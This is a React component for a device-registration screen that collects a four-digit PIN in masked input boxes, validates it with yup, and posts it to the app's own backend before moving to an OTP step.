import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const DeviceRegistration = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [pin, setPin] = useState(new Array(4).fill(""));
  const [loading, setLoading] = useState(false);
  const phoneNumber = "+2349061428807"; // This should come from props or context

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (index < 3 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus();
    }

    setValue("pin", newPin.join(""));
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      document.getElementById(`pin-${index - 1}`).focus();
    }
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header */}
      <div className="bg-gray-100 px-4 py-4 flex items-center">
        <button
          onClick={() => navigate(-1)}
          className="p-2 hover:bg-gray-200 rounded-full transition-colors"
        >
          <svg
            className="w-6 h-6 text-gray-900"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 19l-7-7 7-7"
            />
          </svg>
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-1 px-6 pb-6">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">
            Device Registration
          </h1>
          <p className="text-gray-600 text-base">
            Please verify your identity to register this device
          </p>
        </div>

        {/* Phone Number Card */}
        <div className="bg-gray-200 rounded-2xl p-6 mb-6">
          <p className="text-sm text-gray-600 mb-1">Phone Number:</p>
          <p className="text-lg font-medium text-gray-900">{phoneNumber}</p>
        </div>
      </div>

      {/* Bottom Sheet - PIN Entry */}
      <div className="bg-white rounded-t-3xl px-6 py-8 shadow-2xl">
        {/* Handle Bar */}
        <div className="flex justify-center mb-6">
          <div className="w-12 h-1 bg-gray-300 rounded-full"></div>
        </div>

        <div className="max-w-md mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 text-center mb-3">
            Enter PIN
          </h2>
          <p className="text-gray-600 text-center mb-8 text-sm">
            Please enter your 4-digit PIN for {phoneNumber}
          </p>

          <form onSubmit={handleSubmit(submitForm)}>
            {/* PIN Input Boxes */}
            <div className="flex justify-center gap-4 mb-4">
              {pin.map((data, index) => (
                <input
                  key={index}
                  id={`pin-${index}`}
                  type="password"
                  name="pin"
                  maxLength="1"
                  value={data}
                  onChange={(e) => handleChange(e.target, index)}
                  onKeyDown={(e) => handleKeyDown(e, index)}
                  onFocus={(e) => e.target.select()}
                  className={`w-16 h-16 text-center text-2xl font-semibold border-2 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#1a4d7a] transition-all ${
                    data
                      ? "border-[#1a4d7a] bg-white"
                      : "border-gray-300 bg-white"
                  } ${errors.pin ? "border-red-500" : ""}`}
                  inputMode="numeric"
                  pattern="[0-9]*"
                  autoComplete="off"
                />
              ))}
            </div>

            <div className="mb-6">
              <FormErrMsg errors={errors} inputName="pin" />
            </div>

            {/* Verify Button */}
            <button
              type="submit"
              disabled={loading || pin.some((digit) => digit === "")}
              className="w-full bg-[#90b8c8] text-white py-4 rounded-xl font-semibold text-lg hover:bg-[#7da8b8] transition-colors disabled:opacity-50 disabled:cursor-not-allowed shadow-sm"
            >
              {loading ? "Verifying..." : "Verify"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default DeviceRegistration;
